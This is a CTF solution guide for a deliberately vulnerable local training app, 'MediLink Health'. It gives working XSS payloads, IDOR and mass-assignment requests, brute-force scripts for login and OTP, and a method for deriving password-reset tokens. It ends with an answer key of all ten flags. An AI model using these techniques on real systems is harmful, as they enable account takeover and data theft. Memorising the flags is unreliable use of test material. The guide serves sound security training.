# MediLink Health — CTF Solution Guide

> 🚨 **SPOILERS AHEAD** — open this only if you're stuck.
> Try to solve each challenge yourself first — the learning is in the hunt.

---

## Challenge 01 — Stored XSS (messages)

| | |
|---|---|
| **Vulnerability** | CWE-79 · Stored Cross-Site Scripting |
| **Route** | `POST /messages` → stored, `GET /messages` → rendered, `GET /staff/messages` → blind sink |
| **What's wrong** | The `message` body is stored exactly as submitted. The templates render it with `{{ m.message|safe }}` — the `|safe` filter disables Jinja2's auto-escaping. |
| **How to exploit** | Submit this as the message body: |

```
<script>fetch('/api/beacon?challenge=warmup_stored_xss').then(r=>r.text()).then(t=>alert(t))</script>
```

Then either:
- **Path A (patient inbox):** Visit `GET /messages` — your payload executes and the beacon returns the flag.
- **Path B (staff view):** Log in as staff (or become staff via mass assignment) and visit `GET /staff/messages` — any message containing an XSS signature triggers the flag.

**Server-verifiable path:** If the message contains a live XSS signature (`<script>`, `<img ... onerror=`, etc.), the server automatically awards the flag in the response header (`X-Medilink-Flag`) and registers it as solved.

| **Flag** | `MEDILINK{m3ssag3s_ar3nt_san1t1z3d}` |
|---|---|

---

## Challenge 02 — Reflected XSS (search)

| | |
|---|---|
| **Vulnerability** | CWE-79 · Reflected Cross-Site Scripting |
| **Route** | `GET /search?q=` |
| **What's wrong** | The query string `q` is echoed directly into the page with `{{ q|safe }}`. No sanitization, no escaping. |
| **How to exploit** | Visit: |

```
http://localhost:5000/search?q=<script>fetch('/api/beacon?challenge=reflected_xss').then(r=>r.text()).then(t=>alert(t))</script>
```

The script executes in the response. The beacon returns the flag. Alternatively, the server detects the XSS signature in `q` and auto-awards the flag in the response header.

| **Flag** | `MEDILINK{s3arch_r3fl3ct10n_1s_xss}` |
|---|---|

---

## Challenge 03 — IDOR (patient records)

| | |
|---|---|
| **Vulnerability** | CWE-639 · Insecure Direct Object Reference |
| **Route** | `GET /records/<id>` |
| **What's wrong** | The detail page fetches a record by its numeric ID but **never checks that the logged-in user owns it**. |
| **How to exploit** | Log in as Jordan (patient). Your records are `#1` and `#4`. Try: |

```
GET /records/2   ← Amy Chen's record
GET /records/3   ← Raj Patel's record
```

Either works. The page shows the record and the flag appears in the header + toast.

**Tip:** Try this without writing any code — just edit the URL in your browser. On real programs, IDOR bugs on read paths are the most common access-control finding in 2025–2026.

| **Flag** | `MEDILINK{0wn3rsh1p_ch3ck_wh4t}` |
|---|---|

---

## Challenge 04 — IDOR on write path (appointments)

| | |
|---|---|
| **Vulnerability** | CWE-639 · IDOR on a mutation endpoint |
| **Route** | `POST /appointments/<id>/cancel` |
| **What's wrong** | The cancel endpoint loads the appointment by ID but **does not verify the caller owns it**. Any logged-in patient can cancel any appointment. |
| **How to exploit** | Log in as Jordan. Your appointments start with ID `#1`. Try cancelling someone else's: |

```
POST /appointments/2/cancel    ← Amy Chen's appointment
POST /appointments/3/cancel    ← Raj Patel's appointment
```

The appointment is cancelled and the flag fires. Using `curl`:

```bash
curl -b "session=..." -X POST http://localhost:5000/appointments/2/cancel -i
```

| **Flag** | `MEDILINK{c4nc31l_0th3r_p3opl3s_appt}` |
|---|---|

---

## Challenge 05 — Broken function-level access (staff area)

| | |
|---|---|
| **Vulnerability** | CWE-862 · Missing Authorization (OWASP Broken Access Control) |
| **Route** | `GET /staff` |
| **What's wrong** | The staff dashboard only checks that the user is **logged in** — it does **not** check whether the user's role is `staff`. The link is simply not shown to patients in the nav bar, but the route itself is unprotected. |
| **How to exploit** | Log in as any patient (e.g., Jordan). Navigate directly to: |

```
http://localhost:5000/staff
```

The page loads. A warning says "patient session reached staff page". The flag fires.

**What this teaches:** Hiding a link in the UI is not the same as protecting a route. Every authenticated endpoint must verify authorization server-side.

| **Flag** | `MEDILINK{h1dd3n_l1nk_1snt_s3cur1ty}` |
|---|---|

---

## Challenge 06 — Mass assignment (privilege escalation)

| | |
|---|---|
| **Vulnerability** | CWE-915 · Mass Assignment / OWASP API-3: Object Property Level Authorization |
| **Route** | `PUT /api/profile` |
| **What's wrong** | The profile update API copies **any field the client sends** into the user record — including `role`. The normal UI only sends `name` and `phone`, but nothing stops an attacker from adding `"role": "staff"` to the JSON body. |
| **How to exploit** | Send this PUT request: |

```bash
curl -X PUT http://localhost:5000/api/profile \
  -H "Content-Type: application/json" \
  -b "session=..." \
  -d '{"role":"staff"}'
```

The server responds with `"role": "staff"` and the flag. Your user record in `users.json` now has `role: "staff"`, unlocking the staff-only routes (`/staff/patients`, `/staff/messages`).

**Real-world context:** This is OWASP API Security Top 10 #3 (2023). GitHub's infamous 2012 mass-assignment bug used exactly this pattern.

| **Flag** | `MEDILINK{th3_ap1_tr4sts_3xtra_f13lds}` |
|---|---|

---

## Challenge 07 — No rate limit on login (brute force)

| | |
|---|---|
| **Vulnerability** | CWE-307 · Improper Restriction of Excessive Authentication Attempts |
| **Route** | `POST /login` |
| **What's wrong** | The login endpoint enforces **no lockout, no delay, and no CAPTCHA** after failed attempts. You can try as many passwords as you like. |
| **How to exploit** | The staff account is `dr.alex@medilink.health`. The password follows the format described in the leaked HR memo at `/company-memo.txt`: leetspeak brand + symbol + year. |

Candidates to brute-force (use Burp Intruder, ffuf, or a Python script):
```
M3d1l1nk#2026   ← correct
M3d1l1nk@2026
M3d1l1nk!2026
M3d1l1nk2026
M3dilink#2026
medilink#2026
```

When the correct password is found, the login response contains the flag in the header.

```bash
for pw in M3d1l1nk#2026 M3d1l1nk@2026 M3d1l1nk!2026 M3d1l1nk2026; do
  echo "Trying: $pw"
  curl -s -X POST http://localhost:5000/login \
    -d "email=dr.alex@medilink.health&password=$pw" -i | grep "X-Medilink-Flag"
done
```

| **Flag** | `MEDILINK{unl1m1t3d_l0g1n_gu3ss3s}` |
|---|---|

---

## Challenge 08 — No rate limit on OTP (brute force)

| | |
|---|---|
| **Vulnerability** | CWE-307 · No rate limit on second factor |
| **Route** | `POST /verify-otp` |
| **What's wrong** | After a staff login, a 4-digit OTP is required. But there is **no lockout and no cooldown** — you can brute-force all 10,000 combinations. |
| **How to exploit** | First, complete a staff login (challenge 07). You'll be redirected to `/verify-otp`. Then brute-force the OTP: |

Use Burp Intruder with a numeric payload range 0000–9999, or a Python script:

```python
import requests
s = requests.Session()
s.post('http://localhost:5000/login', data={'email':'dr.alex@medilink.health','password':'M3d1l1nk#2026'})
for i in range(10000):
    code = str(i).zfill(4)
    r = s.post('http://localhost:5000/verify-otp', data={'otp': code})
    flag = r.headers.get('X-Medilink-Flag')
    if flag:
        print(f'OTP: {code} → {flag}')
        break
    if i % 500 == 0:
        print(f'Tried {code}...')
```

The successful request returns the flag. Locally this takes under a minute.

| **Flag** | `MEDILINK{4_d1g1t_0tp_1s_brut3f0rc34bl3}` |
|---|---|

---

## Challenge 09 — Predictable password-reset token

| | |
|---|---|
| **Vulnerability** | CWE-640 · Weak Password Recovery Mechanism |
| **Route** | `POST /forgot` → `GET /reset?token=...` → `POST /reset` |
| **What's wrong** | The reset token is derived deterministically: `md5(user_id | epoch_minute)[:12]`. An attacker who knows the user ID and the current minute can compute the token themselves — no email access required. |
| **How to exploit** | **Step 1 — Recon:** Find Dr. Alex's user ID: |

```bash
curl http://localhost:5000/api/directory
# → {"id":201, "name":"Dr. Alex Rivera", "email":"dr.alex@medilink.health", ...}
```

**Step 2 — Derive the token:**

```python
import hashlib, time
user_id = 201
minute = int(time.time()) // 60
token = hashlib.md5(f"{user_id}|{minute}".encode()).hexdigest()[:12]
print(f"http://localhost:5000/reset?token={token}")
```

**Step 3 — Reset the password:**

```bash
curl "http://localhost:5000/reset?token=<derived_token>"   # loads the form
curl -X POST http://localhost:5000/reset \
  -d "token=<derived_token>&password=MyNewPass123"
```

**Step 4 — Log in** with `dr.alex@medilink.health` / `MyNewPass123` → full staff access, flag awarded.

**Debug hint (view source):** The `/forgot` page contains an HTML comment leaking the algorithm:
`<!-- dev: reset key = md5(<user_id>|<epoch_minute>)[:12] → account 201 issued this minute -->`

| **Flag** | `MEDILINK{pr3d1ct4bl3_r3s3t_t0k3n}` |
|---|---|

---

## Challenge 10 — DOM XSS (note preview)

| | |
|---|---|
| **Vulnerability** | CWE-79 · DOM-based Cross-Site Scripting |
| **Route** | `GET /preview#<payload>` |
| **What's wrong** | The preview page's JavaScript reads `location.hash`, decodes it, and writes it directly to `innerHTML` — a classic DOM XSS sink. The server never sees the payload. |
| **How to exploit** | Visit: |

```
http://localhost:5000/preview#<img src=x onerror="fetch('/api/beacon?challenge=dom_xss').then(r=>r.text()).then(t=>alert(t))">
```

When the page loads, the `onerror` handler fires, the beacon is called, and the flag is returned as JSON. Alert it or read it in DevTools.

**Why the beacon?** The server can't see what's in `location.hash` (it's never sent to the server), so server-verifiable flag delivery doesn't work here. The beacon is the standard pattern for proving client-side XSS — exactly how real blind-XSS exfiltration callbacks work.

| **Flag** | `MEDILINK{h4sh_fr4gm3nt_2_1nn3rhtml}` |
|---|---|

---

## Summary of all 10 flags

```python
FLAGS = {
    "warmup_stored_xss": "MEDILINK{m3ssag3s_ar3nt_san1t1z3d}",
    "reflected_xss":     "MEDILINK{s3arch_r3fl3ct10n_1s_xss}",
    "idor_records":      "MEDILINK{0wn3rsh1p_ch3ck_wh4t}",
    "idor_appointments": "MEDILINK{c4nc31l_0th3r_p3opl3s_appt}",
    "bac_staff":         "MEDILINK{h1dd3n_l1nk_1snt_s3cur1ty}",
    "mass_assignment":   "MEDILINK{th3_ap1_tr4sts_3xtra_f13lds}",
    "nrl_login":         "MEDILINK{unl1m1t3d_l0g1n_gu3ss3s}",
    "nrl_otp":           "MEDILINK{4_d1g1t_0tp_1s_brut3f0rc34bl3}",
    "auth_reset":        "MEDILINK{pr3d1ct4bl3_r3s3t_t0k3n}",
    "dom_xss":           "MEDILINK{h4sh_fr4gm3nt_2_1nn3rhtml}",
}
```

---

## Recommended challenge order (progression)

1. `warmup_stored_xss` — easy warm-up, learn the beacon
2. `reflected_xss` — classic, low-hanging fruit
3. `idor_records` — read-path IDOR, one URL edit
4. `idor_appointments` — write-path IDOR, use curl
5. `bac_staff` — hidden ≠ protected
6. `mass_assignment` — escalate to staff
7. `nrl_login` — brute force with recon hints
8. `nrl_otp` — brute force short OTP (scripting)
9. `auth_reset` — derive reset token from recon + crypto
10. `dom_xss` — pure client-side, learn the beacon path

Some challenges can be solved in any order. The mass-assignment → staff chain unlocks the stored XSS blind path, but isn't required for the flag.

---

*Open this only when stuck. The hunt is the whole point.*
